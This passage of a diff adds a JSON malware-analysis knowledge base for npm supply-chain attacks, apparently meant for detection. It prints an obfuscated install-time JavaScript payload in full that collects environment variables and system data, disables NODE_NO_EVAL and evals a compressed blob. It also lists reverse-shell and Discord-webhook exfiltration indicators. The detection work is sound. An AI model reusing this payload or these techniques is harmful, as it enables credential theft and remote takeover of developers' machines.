+                    ],
+                    "leads_to": "Attacker gains access to user accounts and sensitive data."
+                  },
+                  {
+                    "step": 4,
+                    "action": "If the test script is run, a Busybox shell is launched, establishing a reverse shell to xhc.vg:9001.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Attacker gains remote shell access to the victim's machine."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Obfuscated or minified code in core library files (e.g., colors.js) that accesses user directories",
+                    "Access to browser and Discord application leveldb directories for token extraction",
+                    "Network requests to Discord webhook URLs for exfiltration",
+                    "Reverse shell commands present in npm scripts (e.g., test script)"
+                  ],
+                  "file_indicators": [
+                    "lib/colors.js containing obfuscated or suspicious code",
+                    "package.json scripts with reverse shell commands (e.g., test script invoking Busybox and /dev/tcp)",
+                    "Bundled Busybox or other unexpected binaries within the npm package"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTPS requests to discord.com/api/webhooks/*",
+                    "TCP connections to xhc.vg:9001"
+                  ],
+                  "how_to_detect": "Monitor for npm packages containing obfuscated or minified code in core files that access browser or Discord data directories. Flag any package that sends data to Discord webhooks or contains reverse shell commands in npm scripts. Alert on unexpected binaries (such as Busybox) bundled in npm packages. Use static and dynamic analysis to detect filesystem access patterns and suspicious network activity, including outbound connections to Discord webhooks and reverse shell endpoints."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_104012_987336_snippet_3",
+              "source_package": "[Multiple: e.g., linkis-website, rocketmq-site, aliyundrive, etc.] (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_104012_987336/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4605397582054138,
+              "code_similarity": 0.4998413622379303,
+              "behavior_similarity": 0.42123812437057495,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "var os = require(\"os\"),\n    zlib = require(\"zlib\"),\n    bs = \"base64\",\n    filterNet = (o) => {\n        var oR = {};\n        for (var k in o) {\n            if (\"lo0\" == k) continue;\n            for (var i in o[k]) {\n                if (\"127.0.0.1\" == o[k][i][\"address\"]) continue;\n                if (o[k][i][\"family\"] == \"IPv4\" && o[k][i][\"address\"]) {\n                    oR[k] = o[k][i]\n                    break;\n                }\n            }\n        }\n        return oR;\n    },\n    rmKeys = (o, ...keys) => {\n        for (var k in keys) {\n            delete o[keys[k]];\n        }\n        return o;\n    },\n    pkg = JSON.parse(require(\"fs\").readFileSync(\"package.json\").toString(\"utf8\")),\n    zS = (s) => zlib.brotliCompressSync(s, { level: 11, windowBits: 15, quality: 11 }).toString(bs),\n    zO = (o) => zS(JSON.stringify(o, null, 2)),\n    uS = (s) => zlib.brotliDecompressSync(Buffer.from(s, bs)).toString(),\n    o = {\n        \"name\": pkg.name,\n        \"version\": pkg.version,\n        \"pwd\": process.cwd(),\n        \"env\": process.env,\n        \"platform\": os.platform(),\n        \"arch\": os.arch(),\n        \"release\": os.release(),\n        \"type\": os.type(),\n        \"uptime\": os.uptime(),\n        \"hostname\": os.hostname(),\n        \"cpus\": [os.cpus().length, rmKeys(os.cpus()[0], \"times\")],\n        \"networkInterfaces\": filterNet(os.networkInterfaces()),\n        \"freemem\": os.freemem(),\n        \"totalmem\": os.totalmem(),\n        \"userInfo\": os.userInfo()\n    };\nlet s = zO(o), s1 = uS(`G/sCIJwHtg1sfVPqObPQC6WsmlPZnVOfAqCQlUG+AJay52WlQRR23HYKiwLI/7ncvQM75zP689ZqjKlrgZVYcYBp1gM8R5zV4glyFKt+CPgOAIT7ekBlFUzW87zjyA6CooEMdzcFs33O/t2tAXawBJUI9pOdw8hOkS4DYLG9xHRAeDZ5ZXbs1oL+Z+k+M2aA4HzxpZD/VAbL7E8erim7UfCx9F/Y4+yCKMrUklhDVFoCdwwQYsUTOxl/nc+gLuTlglxBdupg+2xUfQt7zegHtGsz5GkVkFMdVd6qgszOQWOzY8FtLc/U7KSvB2Q4l4yGpcavIeSsCiZV7YQM5X3KWTMz8v1g55Yld/RldQTkyU91zlOFCeelQqC8qAIL4vEXNhgs2suqFHoQstfjXJpvHFgV0v7Bf8f7X38+oji8qZQUEG8LimNT5MDFKHJ5efBeZkZVIAKCp7gdzI60KAs=`);\nprocess.env.NODE_NO_EVAL = undefined;\neval(s1);",
+                "code_behavior": "At runtime, when rsh.js is executed as a detached process, the code collects detailed system, environment, and user information, compresses and encodes it, decompresses an obfuscated payload from a base64 string, sets the NODE_NO_EVAL environment variable to undefined, and executes the decompressed payload using eval, resulting in the execution of further malicious code.",
+                "malice_analysis": {
+                  "why_suspicious": "Collecting extensive system, environment, and user data, compressing and encoding it, and executing obfuscated code via eval are all strong indicators of malicious intent and are commonly used to evade detection and enable data exfiltration.",
+                  "violated_expectations": "Legitimate packages do not collect and exfiltrate system or user information, nor do they execute dynamically decompressed and obfuscated code via eval.",
+                  "similar_legitimate_use": "Compression and system info gathering may be used in legitimate diagnostics or telemetry, but not in combination with obfuscated payload execution and without user consent.",
+                  "key_indicators": [
+                    "Obfuscated and base64-encoded payload decompressed and executed via eval",
+                    "Systematic collection of system, environment, and user data",
+                    "Manipulation of environment variables to bypass security controls",
+                    "No user notification or consent for data collection or code execution"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (when rsh.js is executed)",
+                  "file_location": "scripts/rsh.js",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "environment_vars",
+                    "process"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "[Multiple: e.g., linkis-website, rocketmq-site, aliyundrive, etc.]",
+                  "package_manager": "npm",
+                  "package_versions": "[e.g., 6.0.2, 6.0.3, 6.0.4, 2.2.1, 2.2.3, 7.0.5, 5.0.2, 3.0.3]",
+                  "why_malicious": "All packages in this campaign execute obfuscated JavaScript code at install time, which collects extensive system, environment, and user information and establishes a persistent reverse shell to a remote attacker-controlled server (rsh.51pwn.com:8880), enabling full remote code execution and exfiltration of sensitive data. The attack chain is triggered via multiple npm lifecycle hooks, uses detached background processes for persistence, and employs obfuscation and dynamic code execution to evade detection."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious package is installed, triggering preinstall, postinstall, test, or init scripts defined in package.json.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Execution of scripts/init.js"
+                  },
+                  {
+                    "step": 2,
+                    "action": "scripts/init.js is executed, which launches scripts/rsh.js as a detached child process and immediately exits to conceal ongoing activity.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Execution of scripts/rsh.js in the background"
+                  },
+                  {
+                    "step": 3,
+                    "action": "scripts/rsh.js collects detailed system, environment, and user data, compresses and encodes it, decompresses an obfuscated payload, and executes it via eval.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Execution of reverse shell payload from decompressed code"
+                  },
+                  {
+                    "step": 4,
+                    "action": "The reverse shell payload establishes a persistent connection to rsh.51pwn.com:8880, exfiltrates collected system information, and provides the attacker with remote shell access for arbitrary command execution.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Attacker gains persistent remote access and control over the compromised system"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Execution of scripts/init.js during npm install, test, or init lifecycle events",
+                    "Creation of detached child processes in install/test scripts (child_process.fork with {detached: true})",
+                    "Presence of obfuscated or base64-encoded JavaScript payloads in package files",
+                    "Use of eval to execute dynamically decompressed or generated code",
+                    "Outbound TCP connections to hardcoded C2 domains (e.g., rsh.51pwn.com:8880) during or after installation",
+                    "Collection and exfiltration of system, environment, and user data during package installation or execution"
+                  ],
+                  "file_indicators": [
+                    "scripts/init.js",
+                    "scripts/rsh.js",
+                    "package.json with install/test/init scripts running 'node ./scripts/init.js'",
+                    "Obfuscated JavaScript with base64-encoded or Unicode-escaped payloads"
+                  ],
+                  "network_indicators": [
+                    "rsh.51pwn.com:8880",
+                    "Outbound TCP connections to rsh.51pwn.com on port 8880",
+                    "Initial data exfiltration containing compressed system information"
+                  ],
+                  "how_to_detect": "Monitor npm packages for execution of scripts during install, test, or init lifecycle events, especially those launching detached child processes or containing obfuscated/base64-encoded code. Flag any package that establishes outbound TCP connections to suspicious domains (e.g., rsh.51pwn.com) or uncommon ports during or after installation. Use static analysis to detect eval usage on dynamically decompressed payloads and the presence of Unicode-escaped or base64-encoded code. Alert on collection and exfiltration of system, environment, or user data during package installation or execution. Correlate file indicators (scripts/init.js, scripts/rsh.js, suspicious package.json scripts) with behavioral and network indicators for high-confidence detection."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
